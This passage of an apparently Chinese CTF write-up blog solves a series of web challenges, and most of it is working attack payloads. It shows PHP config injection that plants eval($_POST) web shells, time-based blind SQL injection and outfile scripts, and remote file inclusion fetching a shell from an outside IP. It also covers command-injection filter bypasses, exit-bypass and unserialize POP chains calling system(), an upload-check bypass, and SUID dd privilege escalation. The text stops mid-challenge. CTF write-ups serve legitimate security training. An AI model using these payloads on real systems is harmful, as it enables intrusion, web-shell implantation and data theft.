<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$option=&#x27;chinfo&#x27;;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = preg_replace(&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;, &quot;\$option=&#x27;$str&#x27;;&quot;, $file);</span><br></pre></td></tr></table></figure>
<p>将字符串 <code>$option='任意内容';</code>  替换为 `<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>p</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><msup><mo>=</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">option=&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">o</span><span class="mord mathnormal">p</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>str’;<br>
 简单本地 fuzz 一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?option=\&#x27;;phpinfo();?&gt;</span><br><span class="line">经过addslashes函数处理后的结果:</span><br><span class="line">$str=\\\&#x27;;phpinfo();?&gt;</span><br><span class="line">经过preg_replace函数的替换,config.php里的文件从</span><br><span class="line">&lt;?php</span><br><span class="line">$option=&#x27;chinfo&#x27;;</span><br><span class="line">变成:</span><br><span class="line">&lt;?php</span><br><span class="line">$option=&#x27;\\\&#x27;;phpinfo();?&gt;&#x27;;</span><br><span class="line">等于:</span><br><span class="line">&lt;?php</span><br><span class="line">$option=&#x27;\\&#x27;;phpinfo();?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
<p>此时正好闭合前面的单引号，后面随便插入 php 语句<br>
 payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&#x27;;&lt;?php eval(@$_POST[a]); ?&gt;</span><br></pre></td></tr></table></figure>
<p>payload2:<br>
 借鉴官方的 wp: 用换行符绕过正则匹配</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?option= a&#x27;;%0a?&gt;&lt;?php eval(@$_POST[a]); ?&gt;;//</span><br></pre></td></tr></table></figure>
<p>此时 config.php 为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$option=&#x27; a\&#x27;;</span><br><span class="line">?&gt;&lt;?php eval(@$_POST[a]); ?&gt;;//&#x27;;</span><br></pre></td></tr></table></figure>
<p>再让 a 回复正常，此时传 option 不会影响 shell:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?option=a</span><br></pre></td></tr></table></figure>
<p>config.php:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$option=&#x27; a&#x27;;</span><br><span class="line">?&gt;&lt;?php eval(@$_POST[a]); ?&gt;;//&#x27;;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://s2.loli.net/2023/07/08/x5sAuGbJ4lDd7j9.png" alt="屏幕截图 2023-07-08 214451.png"></p>
<h2 id="7welcomesql"><a class="markdownIt-Anchor" href="#7welcomesql">#</a> 7.WelcomeSQL</h2>
<p>简单数字型 sql 注入，和 sqli-labs 第二关一样</p>
<h2 id="8noobsql"><a class="markdownIt-Anchor" href="#8noobsql">#</a> 8.noobsql</h2>
<p>二次注入:<br>
 官方 wp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select &quot;&quot; into outfile &#x27;//var//www//html//111.php&#x27; #</span><br></pre></td></tr></table></figure>
<h2 id="9easysql"><a class="markdownIt-Anchor" href="#9easysql">#</a> 9.easysql</h2>
<p>提⽰机器⼈查看 robots.txt 继续 t1ips.php 给了 sql 查询语句 直接写脚本爆破密码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> datetime  </span><br><span class="line">  </span><br><span class="line">url = <span class="string">&#x27;http://easysql.challenge.sycsec.com/login.php&#x27;</span>  </span><br><span class="line"><span class="built_in">dict</span> = <span class="string">&#x27;0123456789qwertyuiopasdfghjklzxcvbnm-&#x27;</span>  </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">dict</span>:  </span><br><span class="line">        data = &#123;  </span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;vanzy&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;secretpass&quot;</span>: <span class="string">f&quot;1&#x27;/**/or/**/if(secretpass/**/like/**/&#x27;<span class="subst">&#123;flag + i&#125;</span>%&#x27;,sleep(3),1)#&quot;</span>  </span><br><span class="line">        &#125;  </span><br><span class="line">        time1 = datetime.datetime.now()  </span><br><span class="line">        res = requests.post(url, data=data)  </span><br><span class="line">        time2 = datetime.datetime.now()  </span><br><span class="line">        difference = (time2 - time1).seconds  </span><br><span class="line">        <span class="keyword">if</span> difference &gt; <span class="number">1</span>:  </span><br><span class="line">            flag = flag + i  </span><br><span class="line">            <span class="built_in">print</span>(flag)  </span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h2 id="10justphp"><a class="markdownIt-Anchor" href="#10justphp">#</a> 10.justphp</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> (<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sleeptime</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;SleepTime&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$sleeptime</span>))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$sleeptime</span>))</span><br><span class="line"></span><br><span class="line">   &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;时间是一个数字啊喂！&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$sleeptime</span> &lt; <span class="number">86400</span> * <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">   &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;这点时间哪够Canzik学长睡啊&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$sleeptime</span> &gt; <span class="number">86400</span> * <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">   &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;别让Canzik学长睡死在这啊！&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">   &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;Canzik学长很满足,表示这次把这辈子的觉都睡完啦！flag在这,自己拿吧:&lt;br/&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="title function_ invoke__">sleep</span>((<span class="keyword">int</span>)<span class="variable">$sleeptime</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>86400*30=2592000,科学计数法:2.592e6,十六进制:0x27ac40</code> <br>
payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?SleepTime=2.6e6</span><br></pre></td></tr></table></figure>
<h2 id="11ezrfi"><a class="markdownIt-Anchor" href="#11ezrfi">#</a> 11.ezrfi</h2>
<p>经过简单 fuzz 可以知道替换了 http:// 还在后面加个.html 后缀名，通过 url 参数的？file 可以猜测是文件包含<br>
在 vps 或者虚拟机上挂个 shell.html</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&#x27;rfi&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>修改 url:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hthttp://tp://123.60.42.113/shell</span><br></pre></td></tr></table></figure>
<p>在 post 可以执行命令也可以蚁剑连上<br>
<img data-src="https://s2.loli.net/2023/07/08/sSaNG5hxUXpYmni.png" alt="屏幕截图 2023-07-08 231223.png"></p>
<h2 id="12babyupload"><a class="markdownIt-Anchor" href="#12babyupload">#</a> 12.babyupload</h2>
<p>⽆过滤上传⼀句话⽊⻢即可</p>
<h2 id="13来发个包"><a class="markdownIt-Anchor" href="#13来发个包">#</a> 13. 来发个包</h2>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">btn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> uname = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ifflag&#x27;</span>).<span class="property">value</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> param = <span class="string">&#x27;ifffflag=&#x27;</span>+uname;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">xhr.<span class="title function_">open</span>(<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;flag.php&#x27;</span>,<span class="literal">true</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">xhr.<span class="title function_">send</span>(param);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">if</span>(xhr.<span class="property">readyState</span> == <span class="number">4</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">if</span>(xhr.<span class="property">status</span> == <span class="number">200</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="title function_">alert</span>(xhr.<span class="property">responseText</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> --&gt;</span><br></pre></td></tr></table></figure>
<p>这段代码被注释了，⼤致意思就是给 flag.php 以 post 的⽅式发送⼀个 ifffflag=flag 就能拿到 flag，所以这⾥可以⽤ hackbar/burp 构造请求 包 getflag</p>
<h2 id="14can-can-need"><a class="markdownIt-Anchor" href="#14can-can-need">#</a> 14.Can Can Need</h2>
<p>伪造 IP:Client-Ip: 127.0.0.1<br>
Referer: <span class="exturl" data-url="aHR0cDovL3N5Y3NlYy5jb20=">sycsec.com</span><br>
 伪造 UA:User-Agent: Syclover Browser<br>
 伪造邮箱 From: <span class="exturl" data-url="bWFpbHRvOlZhblpZQFN5Y2xvdmVyLmNvbQ==">VanZY@Syclover.com</span></p>
<p>补:<br>
 伪造代理可以用 Via</p>
<h2 id="15ezrce"><a class="markdownIt-Anchor" href="#15ezrce">#</a> 15.ezrce</h2>
<p>前面那段离谱的注释是与佛论禅编码<br>
但是这里的开头是  <code>佛又曰</code> <br>
所以应该是  <code>与佛论禅重制版V2</code> <br>
 在这个网站:<span class="exturl" data-url="aHR0cHM6Ly90b29scy50YWt1cm9uLnRvcC90YWxrLXdpdGgtYnVkZGhhLw==">https://tools.takuron.top/talk-with-buddha/</span><br>
 里得到新佛曰:<br>
 再在这个网站:<span class="exturl" data-url="aHR0cDovL2hpLnBjbW9lLm5ldC9CdWRkaGEuaHRtbA==">http://hi.pcmoe.net/Buddha.html</span><br>
 得到:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我都懂，我都明白，我是没有策略的防火墙，是被无限绕过的WAF，是扫不出马的EDR，是丢流量的探针，是没升级的态势感知，我守不住内网，也守不住你。#flag或许会在当前目录#</span><br></pre></td></tr></table></figure>
<p>; 可以先执行前面后执行后面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;a=l;b=s;$a$b</span><br></pre></td></tr></table></figure>
<p>看到有个 may_b3_y0u_can_pr0t3ct.php</p>
<p>拼接 cat${IFS} may_b3_y0u_can_pr0t3ct.php:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;a=ca;b=t;c=may_b3_y0u_can_pr0t3ct.ph;d=p;$a$b$&#123;IFS&#125;$c$d</span><br></pre></td></tr></table></figure>
<p y0u_n33d_a_g1rfr1nd="">SYC</p>
<h2 id="16not_stay"><a class="markdownIt-Anchor" href="#16not_stay">#</a> 16.Not_Stay</h2>
<p>考点:exit 死亡绕过</p>
<p><img data-src="https://s2.loli.net/2023/07/09/dRDxf7lXaWihNpr.png" alt="屏幕截图 2023-07-09 195723.png"></p>
<p>分析源码：</p>
<ol>
<li>uuid 函数就是给 <code>$_COOKIE</code>  变量加个随机值</li>
<li>有两个 file_put_contents 函数，第一个写内容到 /tmp/uuid () 生成的值.x 里，但是镜像没用这个.x 导致了非预期解，第二个 file_put_contents 函数往 filename 里写 <code>'&lt;?php exit();?&gt;'.$file_data</code></li>
<li>这里的 waf.php 里有 exif_imagetype 函数，是检查是否有 GIF89a 或 PNG 标识的</li>
<li>第二个 file_put_contents 需要绕过 exit<br>
 首先绕过 exit 可以直接用 base64 编码的方式，但是 base64 只能识别 64 个字符 <code>[a-z0-9A-Z+]</code> , 将会被识别为 phpexit , 解码以 4byte ⼀ 组，由于我们不知道它使用的什么字符编码，也不知道一个字母数字对应多少个字节，可以不断在 GIF89a 和 shell 的 base64 编码之间加字母试探</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/convert.base64- decode/resource=/var/www/html/upload/df405a9-1c31-b8c5-8ce8-36e846421f33/shell.php&amp;data=GIF89aasdPD9waHAgQGV2YWwoJ F9QT1NUWycxMjMnXSk/Pg==</span><br></pre></td></tr></table></figure>
<p>非预期解：利用第一个 file_put_contents</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post:</span><br><span class="line">data=&lt;?php @eval($_POST[&#x27;test&#x27;]);?&gt;</span><br><span class="line">Cookie:</span><br><span class="line">path=../var/www/html/upload/test.php</span><br></pre></td></tr></table></figure>
<h2 id="17easyphp"><a class="markdownIt-Anchor" href="#17easyphp">#</a> 17.easyphp</h2>
<p>提示备份文件，得到源码，简单 pop 链子绕过 wakeup</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:15:&quot;BillyHerrington&quot;:1:&#123;s:1:&quot;a&quot;;O:8:&quot;Baoglady&quot;:2:&#123;s:1:&quot;b&quot;;O:12:&quot;VanDarkholme&quot;:1:&#123;s:1:&quot;d&quot;;N;&#125;s:1:&quot;c&quot;;s:17:&quot;system(&#x27;whoami&#x27;);&quot;;&#125;&#125;</span><br><span class="line"></span><br><span class="line">O:15:&quot;BillyHerrington&quot;:1:&#123;s:1:&quot;a&quot;;O:8:&quot;Baoglady&quot;:2:&#123;s:1:&quot;b&quot;;O:12:&quot;VanDarkholme&quot;:1:&#123;s:1:&quot;d&quot;;N;&#125;s:1:&quot;c&quot;;s:26:&quot;system(&#x27;cat /flagishere&#x27;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="18edit_php"><a class="markdownIt-Anchor" href="#18edit_php">#</a> 18.edit_php</h2>
<p>考点：</p>
<ol>
<li>类似 ueditor 的任意⽂件上传。</li>
<li>提权<br>
抓包发现 catchImg.php?file_url=example.jpg<br>
 访问 catchImg.php 出现源码</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!isset($_COOKIE[&#x27;path&#x27;]))&#123;</span><br><span class="line">    header(&quot;Location: /index.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $path = $_COOKIE[&#x27;path&#x27;];</span><br><span class="line">    if(!is_dir(&#x27;upload/&#x27;.$path))&#123;</span><br><span class="line">        mkdir(&#x27;upload/&#x27;.$path);</span><br><span class="line">        chmod(&#x27;upload/&#x27;.$path,0755);</span><br><span class="line">    &#125;</span><br><span class="line">    function waf($str)&#123;</span><br><span class="line">        $uri = parse_url($str, 5);</span><br><span class="line">        $checklist = [&#x27;gif&#x27;,&#x27;jpg&#x27;,&#x27;png&#x27;];</span><br><span class="line">        $ext = substr($uri,strpos($uri,&quot;.&quot;)+1);</span><br><span class="line">        if(in_array($ext,$checklist))&#123;</span><br><span class="line">            return $uri;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#x27;file_url&#x27;]))&#123;</span><br><span class="line">            $contents = file_get_contents($_GET[&#x27;file_url&#x27;]);</span><br><span class="line">            $ext = substr($_GET[&#x27;file_url&#x27;], strrpos($_GET[&#x27;file_url&#x27;], &quot;.&quot;) + 1);</span><br><span class="line">            $uri = waf($_GET[&#x27;file_url&#x27;]);</span><br><span class="line">            if($uri !== &quot;&quot;)&#123;</span><br><span class="line">                $file_name = substr($uri,&#x27;&#x27;==strpos($uri,&#x27;/&#x27;)?0:1,strpos($uri,&#x27;.&#x27;)-(&#x27;&#x27;==strpos($uri,&#x27;/&#x27;)?0:1));</span><br><span class="line">                file_put_contents(&#x27;upload/&#x27;.$path.&#x27;/&#x27;.md5($file_name).&#x27;.&#x27;.$ext,$contents);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;no resource!&quot;;</span><br><span class="line">        header(&quot;Location: /index.php&quot;);</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">header(&quot;refresh: 0;url=/showImage.php&quot;);</span><br><span class="line">echo &quot;success&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>分析:</p>
<ol>
<li>waf 函数用 strpos (从左往右第一个) 检查后缀名是否是 png,jpg,gif</li>
<li>ext 变量是从右往左得到后缀名，最后的 file_put_contents 也是这么直接拼接 ext 变量的，所以可以用 test.png?.php 绕过 waf 函数的限制<br>
 vps 上挂个马命名为 test.png,</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file_url=http://ip/test.png?.php</span><br></pre></td></tr></table></figure>
<p>连上蚁剑，无法读取 flag 的内容需要提权<br>
虚拟终端：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">发现这里有 dd 命令</span><br><span class="line"></span><br><span class="line">直接用 dd if=/f1ag_is_here_y0u_k0nw 读取flag</span><br></pre></td></tr></table></figure>
<h2 id="19ezrequest"><a class="markdownIt-Anchor" href="#19ezrequest">#</a> 19.ezrequest</h2>
<p>考点：python 的爬虫。re，request 模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> re  </span><br><span class="line">s=requests.session()  </span><br><span class="line">s.keep_alive=<span class="literal">False</span>  </span><br><span class="line">get_url=<span class="string">&#x27;http://testphp:12/?action=index&#x27;</span>  </span><br><span class="line">post_url=<span class="string">&#x27;http://testphp:12/?action=check&#x27;</span>  </span><br><span class="line">r=s.get(url=get_url,verify=<span class="literal">False</span>)  </span><br><span class="line">get_cookie=r.cookies  </span><br><span class="line"><span class="comment">#print(get_cookie)  </span></span><br><span class="line">matched=re.search(<span class="string">&#x27;依梦学姐觉得这个课更好摸鱼:([\d]+)号([\u4e00-\u9fa5]+)&#x27;</span>,r.text.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))  </span><br><span class="line">_num=matched.group(<span class="number">1</span>)  </span><br><span class="line">_<span class="keyword">class</span>=matched.group(<span class="number">2</span>)  </span><br><span class="line"><span class="built_in">print</span>(_num,_<span class="keyword">class</span>)  </span><br><span class="line">data=&#123;  </span><br><span class="line">    <span class="string">&#x27;num&#x27;</span>:_num,  </span><br><span class="line">    <span class="string">&#x27;class&#x27;</span>:_<span class="keyword">class</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line">&#125;  </span><br><span class="line">response=requests.post(url=post_url,data=data,cookies=get_cookie)  </span><br><span class="line"><span class="built_in">print</span>(response.text)  </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> response.cookies:  </span><br><span class="line">    <span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure>
<p>结果:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">23 舞龙舞狮</span><br><span class="line">抢到了!依梦学姐很满意并送了你一块小饼干</span><br><span class="line">&lt;Cookie flag=SYC&#123;just_@_ez_requ3st&#125; for testphp.local/&gt;</span><br></pre></td></tr></table></figure>
<h2 id="20login_into_my_heart"><a class="markdownIt-Anchor" href="#20login_into_my_heart">#</a> 20.login_into_my_heart</h2>
<p s:8:password;s:32:21232f297a57a5a743894a0e4a801fc3;s:8:username;s:5:hacker;s:7:islogin;i:0;="">考点:<br>
 字符增多的反序列化字符逃逸<br>
经过提示的 base64 解码可以得到:<br>
O:3:“Log”:3:</p>
